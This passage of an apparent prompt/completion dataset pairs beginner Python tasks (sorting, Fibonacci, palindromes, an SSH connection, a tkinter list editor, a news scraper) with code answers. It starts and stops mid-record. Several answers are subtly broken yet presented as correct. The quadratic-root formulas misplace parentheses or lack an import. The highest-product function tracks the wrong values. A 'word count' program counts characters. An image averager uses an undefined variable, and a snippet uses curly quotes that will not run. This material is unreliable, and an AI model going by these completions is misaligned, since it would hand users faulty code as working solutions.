Python to establish an SSH connection to a remote computer.","completion":"import paramiko hostname = \\"[REMOTEHOSTNAME]\\" username = \\"[USERNAME]\\" password = \\"[PASSWORD]\\" ssh_client = paramiko.SSHClient() ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh_client.connect(hostname=hostname, username=username, password=password)"},{"prompt":"Write a Python script to make an HTTP request using the Requests library. url = 'https://example.org'","completion":"import requests resp = requests.get(url) if resp.status_code == 200: print('Success!') print(resp.text) else: print('An error occurred.')"},{"prompt":"Create a Python program that takes in a string and counts the number of vowels in it. Hello","completion":"def count_vowels(s): count = 0 for char in s: if char in \\"aeiouAEIOU\\": count += 1 return count s = \\"Hello\\" result = count_vowels(s) print(result)"},{"prompt":"Create a Python function to encode a given sentence into base64.","completion":"import base64 def encodeInBase64(msg): msg_bytes = msg.encode('ascii') base64_bytes = base64.b64encode(msg_bytes) base64_message = base64_bytes.decode('ascii') return base64_message"},{"prompt":"Utilizing the given data, write a Python code to calculate the average of numbers stored in a list. list = [2, 3, 6, 8, 9]","completion":"def calculate_average(lst): sum = 0 for num in lst: sum+=num avg = sum/len(lst) return avg list = [2, 3, 6, 8, 9] average = calculate_average(list) print(\\"Average of list:\\", average)"},{"prompt":"Write a Python program to filter strings linked by commas and return only strings longer than three characters in length. Code,Generation,Task,Instructions","completion":"def filter_strings(string): strings = string.split(',') filtered = [] for s in strings: if len(s) > 3: filtered.append(s) return filtered filtered_strings = filter_strings(\\"Code,Generation,Task,Instructions\\") print(filtered_strings)"},{"prompt":"Create a Python program to determine whether input text is a palindrome. Madam, I'm Adam","completion":"def is_palindrome(text): # preprocess the text to remove whitespace, punctuation, etc text = ''.join(ch for ch in text.lower() if ch.isalpha()) # reverse the text rev_text = text[::-1] # compare the reversed text to the original text return rev_text == text input_text = \\"Madam, I'm Adam\\" if is_palindrome(input_text): print(\\"The text '{}' is a palindrome\\".format(input_text)) else: print(\\"The text '{}' is not a palindrome\\".format(input_text))"},{"prompt":"Write an algorithm in Python to determine if a number is an Armstrong number or not. The number is 370.","completion":"def armstrong_number(num): digits = [int(x) for x in str(num)] n_digits = len(digits) sum_of_cubes = 0 for digit in digits: sum_of_cubes += digit ** n_digits if sum_of_cubes == num: return True else: return False armstrong_number(370)"},{"prompt":"Generate a Python program that reads a line from the user and prints out the number of words in the line.","completion":"def count_words(): sentence = input(\\"Please enter a sentence here: \\") num_words = len(sentence.split()) print(\\"The sentence has\\", num_words, \\"words.\\") count_words()"},{"prompt":"Generate a random Rubik's cube configuration in Python. Not applicable","completion":"import random # Create a 3x3x3 cube cube = [[[0] * 3 for _ in range(3)] for _ in range(3)] # Fill the cube with random colors colors = [1, 2, 3, 4, 5, 6] for plane in cube: for row in plane: for i in range(3): row[i] = random.choice(colors) # Print out the cube configuation for plane in cube: print(plane)"},{"prompt":"This code generates a set of C++ files for the BAGEL package. To use it, create a file named RelCASPT2.cc and add the desired code to it. Then run the script to generate the necessary files.","completion":"#!/opt/local/bin/python import string import os import re def header(n) : return \\"//n // BAGEL - Brilliantly Advanced General Electronic Structure Libraryn // Filename: RelCASPT2\\" + n + \\".ccn // Copyright (C) 2014 Toru Shiozakin //n // Author: Toru Shiozaki <shiozaki@northwestern.edu>n // Maintainer: Shiozaki groupn //n // This file is part of the BAGEL package.n //n // This program is free software: you can redistribute it and/or modifyn // it under the terms of the GNU General Public License as published byn // the Free Software Foundation, either version 3 of the License, orn // (at your option) any later version.n //n // This program is distributed in the hope that it will be useful,n // but WITHOUT ANY WARRANTY; without even the implied warranty ofn // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See then // GNU General Public License for more details.n //n // You should have received a copy of the GNU General Public Licensen // along with this program. If not, see <http://www.gnu.org/licenses/>.n //n n #include <bagel_config.h>n #ifdef COMPILE_SMITHn n n #include <src/smith/relcaspt2/RelCASPT2.h>n\\" def insert(): return \\"#include <src/smith/relcaspt2/RelCASPT2_tasks.h>n\\" def header2(): return \\"n using namespace std;n using namespace bagel;n using namespace bagel::SMITH;n n \\" footer = \\"#endifn\\" f = open('RelCASPT2.cc', 'r') lines = f.read().split(\\"n\\")[34:] tasks = [] tmp = \\"\\" for line in lines: if (len(line) >= 17 and (line[0:17] == \\"shared_ptr<Queue>\\" or line[0:17] == \\"RelCASPT2::RelCAS\\")): if (tmp != \\"\\"): tasks.append(tmp) tmp = \\"\\" tmp += line + \\"n\\" if (line == \\"}\\"): tmp += \\"n\\" tasks.append(tmp) p = re.compile('make_[a-z0-9]+q') for task in tasks[0:-1]: tag = p.search(task).group()[5:] fout = open(\\"RelCASPT2_\\" + tag + \\".cc\\", \\"w\\") out = header(\\"_\\" + tag + \\"q\\") + insert() + header2() + task + footer fout.write(out) fout.close() os.remove(\\"RelCASPT2.cc\\") fout = open(\\"RelCASPT2.cc\\", \\"w\\") out = header(\\"\\") + header2() + tasks[len(tasks)-1] + footer fout.write(out) fout.close()"},{"prompt":"Convert the following JavaScript function to Python. function double(x) { return 2 * x; }","completion":"def double(x): return 2 * x"},{"prompt":"Create an algorithm for sorting numbers in Python that uses selection sort. [8, 5, 2, 9, 5, 6, 3]","completion":"def selectionSort(nums): for i in range(len(nums) - 1): # Find the minimum element in the unsorted array # Assume it is the first element min_index = i for j in range(i+1, len(nums)): if nums[j] < nums[min_index]: min_index = j # Swap the minimum element with the first element if min_index != i: nums[i], nums[min_index] = nums[min_index], nums[i] return nums print(selectionSort([8, 5, 2, 9, 5, 6, 3])) # [2, 3, 5, 5, 6, 8, 9]"},{"prompt":"Develop a Python guess the number game. The program should pick a random number between 1 to 10 and the user has to guess it. Not applicable","completion":"import random answer = random.randint(1, 10) guess = int(input('Guess a number between 1 and 10: ')) if guess == answer: print('You guessed correct!') elif guess < answer: print('Your guess is too low') elif guess > answer: print('Your guess is too high')"},{"prompt":"Write a Python program to create a stack using a linked list.","completion":"class Node: def __init__(self, data): self.data= data self.next = None class Stack: def __init__(self): self.head = None self.tail = self.head self.items = 0 def push(self, data): new_node = Node(data) if self.head is None: self.head = new_node else: new_node.next = self.head self.head = new_node self.tail = self.head self.items +=1 def pop(self): if self.head is None: return None data = self.head.data self.head = self.head.next self.items -= 1 return data"},{"prompt":"Create an algorithm in Python that takes in a sequence of numbers and finds the two numbers that have the highest product. Sequence of numbers: 4, 2, 10, 8, 9","completion":"def highest_product(arr): largest = max(arr[0], arr[1]) smallest = min(arr[0], arr[1]) largest_product = arr[0] * arr[1] for i in range(2, len(arr)): if arr[i] > largest: largest = arr[i] elif arr[i] < smallest: smallest = arr[i] largest_product = max(largest_product, largest*smallest) return largest_product print(highest_product([4, -2, 10, 8, 9]))"},{"prompt":"Design a neural network to recognize handwritten digits in Python. Not applicable","completion":"import numpy as np import tensorflow as tf from tensorflow.keras import layers # define the model model = tf.keras.Sequential() model.add(layers.Conv2D(32, (3, 3), activation='relu', input_shape=(28, 28, 1))) model.add(layers.MaxPooling2D((2, 2))) model.add(layers.Conv2D(64, (3, 3), activation='relu')) model.add(layers.MaxPooling2D((2, 2))) model.add(layers.Conv2D(64, (3, 3), activation='relu')) model.add(layers.Flatten()) model.add(layers.Dense(64, activation='relu')) model.add(layers.Dense(10, activation='softmax')) # compile the model model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])"},{"prompt":"Make a program to find and replace all occurrences of a certain word in a string using Python. String: 'Course: Machine Learning, Platform: Coursera.' Word: 'Course' Word to replace: 'Program'","completion":"def replace_all_occurrences(string, word, replace_word): \\"\\"\\" This function takes a string and finds all occurrences of the given 'word' and replaces it with the 'replace_word'. \\"\\"\\" new_str = string.replace(word, replace_word) return new_str # Driver Code text = 'Course: Machine Learning, Platform: Coursera.' word = 'Course' replace_word = 'Program' print(replace_all_occurrences(text, word, replace_word))"},{"prompt":"This code reads images from a directory, averages their pixel intensities, and saves the resulting image in an output directory. To use this code, run the script with the commandline arguments d or directory followed by the path to the directory of images to average, and o or outdir followed by the path to the output directory.","completion":"#!/usr/bin/env python import argparse import numpy as np import sys, os from os import listdir import plantcv as pcv import datetime # Parse command-line arguments def options(): parser = argparse.ArgumentParser(description=\\"Get images from an SQLite database and some input information\\") parser.add_argument(\\"-d\\", \\"--directory\\", help=\\"path to directory of images to average.\\") parser.add_argument(\\"-o\\", \\"--outdir\\", help=\\"Output directory.\\", required=False) args = parser.parse_args() return args # Functions def average_all_img(directory,outdir): allfiles=os.listdir(directory) path=str(directory) allpaths=[] for files in allfiles: p=path+str(files) allpaths.append(p) img, path, filename = pcv.readimage(allpaths[0]) n=len(allpaths) if len(np.shape(img))==3: ix,iy,iz=np.shape(img) arr=np.zeros((ix,iy,iz),np.float) else: ix,iy=np.shape(img) arr=np.zeros((ix,iy,iz),np.float) # Build up average pixel intensities, casting each image as an array of floats for i,paths in enumerate(allpaths): img,path,filename=pcv.readimage(allpaths[i]) imarr=np.array(img,dtype=np.float) arr=arr+imarr/n #Round values in array and cast as 8-bit integer arr=np.array(np.round(arr),dtype=np.uint8) pcv.print_image(arr, (str(outdir)+\\"average_\\"+str(allfiles[0]))) # Main pipeline def main(): # Get options args = options() average_all_img(args.directory, args.outdir) if __name__ == '__main__': main()"},{"prompt":"Develop a Python program to calculate the largest sum of a consecutive sequence of n numbers given in an array. array = [1, 2, 5, 4, 5, 7, 8]","completion":"def max_consecutive_sum(array): max_val = 0 cur_man = 0 for x in array: cur_man = max(cur_man + x, 0) max_val = max(cur_man, max_val) return max_val"},{"prompt":"Create a function in Python that takes an input string and returns whether it is a palindrome. txt = madam","completion":"def isPalindrome(txt): i = 0 j = len(txt) - 1 while i < j: if txt[i] != txt[j]: return False i += 1 j -= 1 return True print(isPalindrome(txt)) // True"},{"prompt":"Create a Python program that prints the sum of all integers that are divisible by 3 and 5 from 0 to a given number. Max number: 10","completion":"def sum_divisible_by_3_and_5(n): s = 0 for i in range(n + 1): if i % 3 == 0 or i % 5 == 0: s += i return s print(sum_divisible_by_3_and_5(10)) # 33"},{"prompt":"Create a python script to generate a set of random numbers between 1 and 10, and print out the largest number in the set.","completion":"import random random_numbers = [random.randint(1, 10) for _ in range(20)] max_number = max(random_numbers) print(random_numbers) print(f'The largest number is {max_number}')"},{"prompt":"Create a class in Python that will return the sum of two numbers.","completion":"class Summator: def __init__(self, num1, num2): self.num1 = num1 self.num2 = num2 def get_sum(self): return self.num1 + self.num2"},{"prompt":"Design a data structure in Python to store information about students.","completion":"class Student: def __init__(self, name, age, gender, college): self.name = name self.age = age self.gender = gender self.college = college"},{"prompt":"Write a Python program to take three numbers from the user and check if the sum of any two numbers equals to the third one.","completion":"def check_triplet_sum(a, b, c): if a + b == c or b + c == a or a + c == b: return True else: return False a = int(input(\\"Enter the first number: \\")) b = int(input(\\"Enter the second number: \\")) c = int(input(\\"Enter the third number: \\")) if check_triplet_sum(a, b, c): print(\\"Numbers can form a triplet.\\") else: print(\\"Numbers cannot form a triplet.\\")"},{"prompt":"Create an algorithm in Python to rotate an array of numbers by k elements. Array: [1,2,3,4,5], k=2","completion":"def rotate_array(arr, k): n = len(arr) for i in range(k): temp = arr[n-1] for i in range(n-1,0,-1): arr[i] = arr[i-1] arr[0] = temp return arr print(rotate_array([1,2,3,4,5],2)) # prints [4,5,1,2,3]"},{"prompt":"Write a function in Python that takes a single argument, an unsigned integer, and returns the binary representation of that argument as a string. number = 5","completion":"def IntToBinString(number): if number == 0: return \\"0\\" ret = \\"\\" while number > 0: if number % 2 == 1: ret = \\"1\\" + ret else: ret = \\"0\\" + ret number //= 2 return ret"},{"prompt":"Create a program in Python to capitalize the first letter of a given string. hello world","completion":"def capitalize_first_letter(text): return text[0].upper() + text[1:] print(capitalize_first_letter(\\"hello world\\")) # Output: Hello world"},{"prompt":"Develop a user interface in python tkinter to add, modify, and delete items from a list.","completion":"# imports import tkinter as tk # window config win = tk.Tk() win.title(\\"list operations\\") # list variable data = [] # functions def add_item(): data.append(txt_input.get()) refresh_list() def delete_item(): data.remove(lst_data.get(tk.ACTIVE)) refresh_list() def modify_item(): data[lst_data.curselection()[0]] = txt_input.get() refresh_list() def refresh_list(): lst_data.delete(0, tk.END) for item in data: lst_data.insert(tk.END, item) # frame frm_list = tk.Frame(win) lbl_input = tk.Label(frm_list, text=\\"Input\\") txt_input = tk.Entry(frm_list, width=15) lbl_input.grid(row=0, column=0) txt_input.grid(row=0, column=1) # listbox config lst_data = tk.Listbox(frm_list, height=5) lst_data.grid(row=1, column=0, columnspan=2) # button config btn_add = tk.Button(frm_list, text=\\"add\\", command=add_item) btn_delete = tk.Button(frm_list, text=\\"delete\\", command=delete_item) btn_modify = tk.Button(frm_list, text=\\"modify\\", command=modify_item) btn_add.grid(row=2, column=0) btn_delete.grid(row=2, column=1) btn_modify.grid(row=2, column=2) # frame grid frm_list.grid(row=0, column=0) win.mainloop()"},{"prompt":"Write a Python program to create a dictionary from two lists where the first list contains keys and the second list contains values. keys = ['a', 'b', 'c', 'd'] values = [1, 2, 3, 4]","completion":"def create_dictionary(keys, values): dictionary = dict(zip(keys, values)) return dictionary dictionary = create_dictionary(keys, values) print(dictionary)"},{"prompt":"Provide a Python script that returns the number of words in a given sentence This is a test sentence","completion":"def word_count(sentence): words = sentence.split() return len(words)"},{"prompt":"Create a program in Python to calculate the total marks of 5 students taking 5 different exams. The marks should be in the range 0100. Not applicable","completion":"def total_marks(marks): total = 0 for student in marks: total += sum(student) return total marks = [[75, 75, 76, 78, 80], [90, 88, 87, 85, 83], [68, 70, 79, 82, 76], [80, 79, 66, 77, 85], [90, 85, 83, 75, 73]] total = total_marks(marks) print(total)"},{"prompt":"Create a hierarchical clustering algorithm in Python to group data points into clusters. data_points=[1,2,3,4,5]","completion":"import numpy as np from scipy.cluster.hierarchy import dendrogram, linkage # define the data points data_points = np.array([1,2,3,4,5]) # create the linkage matrix linkage_matrix = linkage(data_points, 'ward') # generate the dendrogram dendrogram(linkage_matrix)"},{"prompt":"Generate a Python code to generate a random integer between 1 and 10.","completion":"import random rand_int = random.randint(1, 10)"},{"prompt":"Create a function in Python that takes a list of strings and returns a list of dictionaries containing the frequency of each character in each string. ['hello', 'world']","completion":"def character_frequency(strings): result = [] for string in strings: freq = {} for char in string: if char in freq: freq[char] += 1 else: freq[char] = 1 result.append(freq) return result print(character_frequency(['hello', 'world'])) # Output: [{'h': 1, 'e': 1, 'l': 2, 'o': 1}, {'w': 1, 'o': 1, 'r': 1, 'l': 1, 'd': 1}]"},{"prompt":"Create a Django project that allows users to register and log in.","completion":"# To create a Django project, run the following command: django-admin startproject projectname # To create an app inside the project (e.g. accounts app): python manage.py startapp accounts \`\`\` # In accounts/views.py from django.shortcuts import render from django.contrib.auth import authenticate, login from .forms import RegisterForm def register_view(request): if request.method == 'POST': forms = RegisterForm(request.POST) if forms.is_valid(): user = forms.save() user.refresh_from_db() # load the profile instance created by the signal user.save() raw_password = forms.cleaned_data.get('password1') user = authenticate(username=user.username, password=raw_password) login(request, user) return redirect('index') else: forms = RegisterForm() return render(request, 'accounts/register.html', {'forms': forms}) \`\`\`"},{"prompt":"Write a function in Python to find the sum of all elements of a given list. inputList = [1, 2, 3, 4, 5]","completion":"def sum_list(inputList): sum_list = 0 for num in inputList: sum_list += num return sum_list"},{"prompt":"Write a script in Python to find roots of a quadratic equation (ax2 + bx +c = 0). a = 4 b = 5 c = 6","completion":"import math def findRoots(a, b, c): discriminant = (b * b) - (4 * a * c) if discriminant > 0: root1 = (-b + math.sqrt(discriminant) / (2 * a)) root2 = (-b - math.sqrt(discriminant) / (2 * a)) return (root1, root2) elif discriminant == 0: root1 = root2 = -b / (2 * a) return (root1, root2) else: return (None, None) findRoots(4, 5, 6)"},{"prompt":"Create an algorithm in Python to solve the classic 15 puzzle game. Not applicable","completion":"def solver(board): zero_position = find_zero(board) # find the zero tile of the board if not zero_position: # no zero tile found return False # try each possible move for move in possible_moves(board): board_copy = board.copy() #copy board in order not to change it board_copy = make_move(board_copy, zero_position, move) if board_copy == goal: # goal found return True else: if (solver(board_copy)): return True # call itself again if the move brings us closer to the goal return False # no goal found"},{"prompt":"Write a Python program to calculate the roots of a quadratic equation with given coefficients. Coefficients: a = 2, b = 5, c = 3","completion":"def calculate_roots(a, b, c): # calculate the discriminant d = (b**2) - (4*a*c) # find two solutions sol1 = (-b-cmath.sqrt(d))/(2*a) sol2 = (-b+cmath.sqrt(d))/(2*a) return sol1, sol2"},{"prompt":"Write a function in Python to predict a label for a given input. [5, 2, 4]","completion":"def predict(x): if x[0] > 0: return 'positive' if x[1] < 0: return 'negative' if x[2] > 0: return 'positive' return 'neutral'"},{"prompt":"Write a Python program to print food items along with their prices from a given dictionary of food items and prices. food_items = { 'Burger': 3.99, 'Fries': 1.99, 'Pizza': 12.99 }","completion":"for item, price in food_items.items(): print(f'{item}: {price}')"},{"prompt":"Write a Python program which takes an input string, removes all nonalphanumeric characters, and prints all of the words used in the string along with the number of times each word appears? This is some text with many words in it.","completion":"words = [] # remove all non-alphanumeric characters for char in string: if char.isalnum(): words.append(char) # count number of times each word is used word_count = {} for word in words: if word in word_count: word_count[word] += 1 else: word_count[word] = 1 for k,v in word_count.items(): print('{} : {}'.format(k,v))"},{"prompt":"Write a Python program that prints out the longest word in a sentence. The quick brown fox jumped over the lazy dog","completion":"sentence = \\"The quick brown fox jumped over the lazy dog\\" words = sentence.split() longest_word = '' for word in words: if len(word) > len(longest_word): longest_word = word print(longest_word)"},{"prompt":"Rewrite this Python code in Java. nums = [1, 5, 7, 10] for i in nums: print(i)","completion":"int[] nums = {1, 5, 7, 10}; for (int i : nums) { System.out.println(i); }"},{"prompt":"Compile a Python program to retrieve the nth Fibonacci number in the series. 5","completion":"def Fibonacci(n): if n<0: print(\\"Incorrect input\\") elif n==1: return 0 elif n==2: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) num = 5 print(Fibonacci(num))"},{"prompt":"Write a code snippet in Python to print the date after 30 days from the current date.","completion":"from datetime import date, timedelta d = date.today() print(d + timedelta(days = 30))"},{"prompt":"Compile a given python code that uses a specific library or package into an executable.","completion":"import py_compile py_compile.compile(\\"<python_code_file>\\", cfile=\\"<executable_name>\\", doraise=True)"},{"prompt":"Generate a Python script to sort a given list of numbers without using the builtin function \`\`sort()\`\` list = [3,2,7,5,4,1,8]","completion":"def sort_list(list): '''This function will sort a given list of numbers without using the built-in function sort()''' for i in range(len(list)): for j in range(i+1, len(list)): if list[i] > list[j]: list[i], list[j] = list[j], list[i] return list"},{"prompt":"Write a python class to read an xml document and display the results.","completion":"class XmlReader: def __init__(self, file_name): self.file_name = file_name def get_document(self): with open(self.file_name, 'r') as f: doc = f.read() return doc def get_xml_data(self): doc = self.get_document() tree = ElementTree.fromstring(doc) root = tree.getroot() # iterate all elements and attributes return root"},{"prompt":"Create a web crawler in Python to scrape the latest news headlines from CNN. Not applicable","completion":"import requests from bs4 import BeautifulSoup def scrap_cnn(): #make a request to CNN's homepage response = requests.get('https://cnn.com') # parse the html content soup = BeautifulSoup(response.text,'html.parser') # extract all the headline elements headlines = soup.find_all('h3', class_ = 'cd__headline') # scrape the text from the elements news_headlines = [headline.text for headline in headlines] # return the list of headlines return news_headlines if __name__ == \\"__main__\\": headlines = scrap_cnn() for headline in headlines: print(headline)"},{"prompt":"Create a program in Python that prints Greetings for any name that is passed as an argument. Andrew","completion":"import sys name = sys.argv[1] print(\\"Greetings, \\"+name+\\"!\\")"},{"prompt":"Generate a function in Python that takes an array of numbers and returns an array of the squares of the numbers. [1,2,3]","completion":"\\"\\"\\" A function to return the squares of an array in Python \\"\\"\\" def square_array(input_array): squared_array = [] for i in input_array: squared_array.append(i*i) return squared_array"},{"prompt":"Create an algorithm in Python to sort an array of integers. The array to be sorted: [2, 1, 6, 5, 8]","completion":"def quicksort(array): if len(array) <= 1: return array pivot = array[len(array) // 2] left = [x for x in array if x < pivot] middle = [x for x in array if x == pivot] right = [x for x in array if x > pivot] return quicksort(left) + middle + quicksort(right) # test array = [2, 1, 6, 5, 8] print(quicksort(array))"},{"prompt":"Create code to search for a specific word in an array of strings. mywords = [Hello, World, Python, Programming] search_word = Python","completion":"\\"\\"\\" Create code to search for a specific word in an array of strings \\"\\"\\" mywords = [\\"Hello\\", \\"World\\", \\"Python\\", \\"Programming\\"] search_word = \\"Python\\" #Set a boolean flag to track the search found = False #Loop through the array of strings for word in mywords: #Compare the current word with the search word if word == search_word: #Print out the word if found print(\\"Found the word: \\" + word) #Set the flag to True found = True #Check the flag after the loop is complete if not found: print(\\"Cannot find the word: \\" + search_word)"},{"prompt":"Create a Python program to classify an email as spam or not spam. This email body contains some overly spammy words.","completion":"import re def classify(text): spam_words = [\\"free\\", \\"prize\\", \\"win\\", \\"offer\\"] is_spam = False for w in spam_words: if re.search(w, text): is_spam = True if is_spam: return \\"This is a spam email.\\" else: return \\"This is not a spam email\\" print(classify(\\"This email body contains some overly spammy words.\\"))"},{"prompt":"Generate a python program that calculates the total cost of all items in a given list [(apple, 5, 50),(mango,6,70)]","completion":"def total_cost(items): total_cost = 0 for item in items: quantity = item[1] unit_price = item[2] total_cost += quantity * unit_price return total_cost"},{"prompt":"Generate a program in Python to print all prime numbers between 1 and 50.","completion":"# print all prime numbers between 1 and 50 for num in range(1,51): # prime numbers are greater than 1 if num > 1: for i in range(2,num): if (num % i) == 0: break else: print(num)"},{"prompt":"Develop a Python class which allows users to access and control additional hardware components which are connected to the computer.","completion":"# Import necessary libraries import sys, serial class HardwareController: \\"\\"\\" This class allows users to access and control additional hardware components which are connected to the computer via USB. \\"\\"\\" def __init__(self): self.serial_port = None self.baud_rate = None # Establish connection between computer and hardware component def connect(self, serial_port, baud_rate): try: self.serial_port = serial.Serial(serial_port, baud_rate) self.baud_rate = baud_rate return True except: # Return false and print error if connection fails print(\\"Error: Failed to connect to the device. Check baud rate and serial port.\\") return False # Write data to the hardware component def write(self, data): if self.serial_port.isOpen(): self.serial_port.write(data) else: print(\\"Error: Device is not connected. Connect to the device first and try again.\\") # Read data from the hardware component def read(self): if self.serial_port.isOpen(): return self.serial_port.readline() else: print(\\"Error: Device is not connected. Connect to the device first and try again.\\") # Disconnect from the hardware component def disconnect(self): self.serial_port.close() self.serial_port = None"},{"prompt":"Create a python program to calculate the Mertens function over a given range.","completion":"# Function to calculate the Mertens function def mertens_function(m): # Initialize the result res = 0 # Iterate over all numbers from 1 to m for j in range(1, m+1): res += moebius_function(j) return res # Function to calculate the Moebius function def moebius_function(n): # Initialize result res = 1 # Iterate over all factors for i in range(2, n + 1): cnt = 0 while n % i == 0: n = int(n / i) cnt += 1 if cnt > 1: res = 0 break if cnt == 1: res = -res return res # Main Program m = int(input(\\"Enter the range: \\")) res = mertens_function(m) print(\\"The Mertens function of\\", m, \\"is\\", res)"},{"prompt":"mplement a solution in Python using loops, to determine the maximum number of consecutive 1's in a binary number. 1011101101","completion":"def max_consecutive_ones(n): max_ones = 0 count = 0 while n > 0: if n %2 == 1: count+=1 max_ones = max(max_ones, count) else: count = 0 n>>=1 return max_ones"},{"prompt":"Create a python function that takes in a list of strings and returns a dictionary mapping each string to its length in the list. Input: [Hello, World, I, am, here]","completion":"def string_length_dictionary(lst): \\"\\"\\" Creates a dictionary mapping each string to its length in a list Parameters ---------- lst : list of strings a list of strings Returns ------- dict a dictionary mapping string to its length \\"\\"\\" length_dict = {} for word in lst: length_dict[word] = len(word) return length_dict if __name__ == '__main__': print(string_length_dictionary([\\"Hello\\", \\"World\\", \\"I\\", \\"am\\", \\"here\\"]))"},{"prompt":"Develop a function in Python which takes a sentence as input and prints out the number of times each character appears in the sentence. Hello World!","completion":"def characterCount(string): # Create a dictionary to store the count of characters charCount = {} # Iterate through the characters of the string for character in string: # Initialize the count of characters in the dictionary if character in charCount.keys(): charCount[character] += 1 else: charCount[character] = 1 # Print the output print(charCount) characterCount(\\"Hello World!\\") // Outputs: {'H': 1, 'e': 1, 'l': 3, 'o': 2, ' ': 1, 'W': 1, 'r': 1, 'd': 1, '!': 1}"},{"prompt":"Write a Python program to convert a given temperature from Celsius to Fahrenheit using a given formula. Temperature in Celsius: 30","completion":"def celsius_to_fahrenheit(celsius): fahrenheit = (celsius * 9/5) + 32 return fahrenheit celsius_to_fahrenheit(30) # returns 86.0"},{"prompt":"Create a class 'Person' in Python, which has attributes name, age, gender and blood group.","completion":"class Person: def __init__(self, name, age, gender, blood_group): self.name = name self.age = age self.gender = gender self.blood_group = blood_group"},{"prompt":"Train a supervised learning model in Python to predict the outcome of a horse race.","completion":"# Imports import numpy as np from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score from sklearn.tree import DecisionTreeClassifier # Load the dataset data = np.loadtxt('horse_race_data.txt') X_data = data[:, :-1] y_data = data[:, -1] # Split into training set and test set X_train, X_test, y_train, y_test = train_test_split(X_data, y_data, test_size=0.2) # Train the model clf = DecisionTreeClassifier() clf.fit(X_train, y_train) # Make predictions predictions = clf.predict(X_test) # Evaluate the model accuracy = accuracy_score(y_test, predictions) print('Model accuracy: ' + str(accuracy))"},{"prompt":"Generate a Python function that takes a list and a target number as input and returns a list of the indices of all elements in the given list that are smaller than the given target number. [2, 3, 4, 5, 6], 4","completion":"def find_smaller_elements(nums, target): indices = [] for i, num in enumerate(nums): if num < target: indices.append(i) return indices result = find_smaller_elements([2, 3, 4, 5, 6], 4) print(result) # [0, 1]"},{"prompt":"Analyze the following code and explain how it works. def generate_random_string(n): # String of alphabets, numbers, and special characters alphabets = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#&* # Initialize a string res = # Generate random string for i in range(n): res += alphabets[random.randint(0,len(alphabets)1)] return re","completion":"This function accepts a parameter n which denotes the length of the random string to generate. It creates a string containing all the alphabets, numbers, and special characters. It initializes a result string to store the random string generated and then uses the Python random() method to generate a random index in the range of the length of the alphabets string. It then assigns the character at the random index to the result string and then loops until it generates a string of the given length. Finally, it returns the randomly generated string."},{"prompt":"Design an objectoriented Python class for a Car object which contains private fields for Milage, TopSpeed, and Manufacturer. Not applicable","completion":"class Car: def __init__(self, milage, top_speed, manufacturer): self.__milage = milage self.__top_speed = top_speed self.__manufacturer = manufacturer @property def milage(self): return self.__milage @property def top_speed(self): return self.__top_speed @property def manufacturer(self): return self.__manufacturer"},{"prompt":"Create a Python script that when executed, prints out the sum of the first 10 even numbers.","completion":"sum = 0 for i in range(2,21,2): #Range(start,stop-1,step size) sum += i print(sum)"},{"prompt":"Write a Python program to check if the given matris is a symmetric matrix. A = [[1,2,3], [2,0,4], [3,4,5]]","completion":"def is_symmetric(a): n = len(a) for i in range(n): for j in range(n): if a[i][j] != a[j][i]: return False return True A = [[1,2,3], [-2,0,4], [3,-4,5]] print(is_symmetric(A))"},{"prompt":"Create a Python program to automate the process of filing receipts and invoices.","completion":"import os import shutil # define a function to move file to designated folder def move_file (src_path, dest_path): shutil.move(src_path, dest_path) print(\\"File moved from\\", src_path, \\"to\\", dest_path) # define source and destination src_dir = \\"./Unfiled_Documents/\\" dest_dir = \\"./Invoices_and_Receipts/\\" # iterate through the files for root, dirs, files in os.walk(src_dir): for file in files: # check the file type filename, file_extension = os.path.splitext(file) if file_extension in ['.pdf', '.odt', '.docx']: # move the file src = os.path.join(root, file) dest = dest_dir + 'invoice_or_receipt' + file_extension move_file(src, dest)"},{"prompt":"Create a Python script that sorts a list of dictionaries in ascending order based on a specific key value. list_of_dicts = [{'name':'John','age':32}, {'name':'Doe','age':22}, {'name': 'Jane','age':44}]","completion":"def sort_list_of_dicts_asc(list_of_dicts, key): return sorted(list_of_dicts, key=lambda dict: dict[key]) sorted_list_of_dicts = sort_list_of_dicts_asc(list_of_dicts, 'age') print(sorted_list_of_dicts) # prints [{'name': 'Doe', 'age': 22}, {'name': 'John', 'age': 32}, {'name': 'Jane', 'age': 44}]"},{"prompt":"mplement a python script to generate a random string of length 10 containing only alphabets.","completion":"import string import random # generate a random string of length 10 def generateRandomString(length): letters = string.ascii_letters return ''.join(random.choice(letters) for i in range(length)) rand_string = generateRandomString(10) print(rand_string)"},{"prompt":"Develop a Python program to compute the nth Fibonacci number with recursion.","completion":"def Fibonacci(n): if n<0: print(\\"Incorrect input\\") # First Fibonacci number is 0 elif n==1: return 0 # Second Fibonacci number is 1 elif n==2: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) # Driver Program print(Fibonacci(9))"},{"prompt":"Construct a Python program to check whether a given number is prime or not. 13","completion":"def check_prime(num): if num == 1: return False for i in range(2,num): if not num % i: return False return True result = check_prime(13) print(result)"},{"prompt":"Create a Python Program to print the Fibonacci sequence up to n terms Print the Fibonacci sequence up to the 5th term","completion":"def Fibonacci(n): # First and second number in the sequence Fib_list = [0, 1] # Generate the Fibonacci sequence up to n terms for i in range(2,n): Fib_list.append(Fib_list[i-2] + Fib_list[i-1]) return Fib_list # Driver code n = 5 print(Fibonacci(n))"},{"prompt":"Create a function in Python to check if a list contains duplicates. [1, 3, 2, 4, 5, 3]","completion":"def contains_duplicates(list): seen = set() for item in list: if item in seen: return True seen.add(item) return False list = [1, 3, 2, 4, 5, 3] print(contains_duplicates(list))"},{"prompt":"Create an algorithm in Python to check if two words are a sudoku valid pair. word1 = “ready”, word2 = “steady”","completion":"def is_sudoku_valid_pair(word1, word2): is_valid = True for i in range(len (word1)): if word1[i] == word2[i]: is_valid = False break for i in range (len(word1)): for j in range(len(word2)): if word1[i] == word2[j]: is_valid = False break return is_valid word1 = “ready” word2 = “steady” print(is_sudoku_valid_pair(word1, word2))"},{"prompt":"Design an automation system using Python that can receive sensor data and respond with different actions. The sensor data should involve temperature and humidity readings.","completion":"import time import random def check_sensors(): # Get temperature and humidity from sensors temperature = random.randint(20,30) humidity = random.randint(40,60) # Decide if the temperature/humidity is within range if (temperature <= 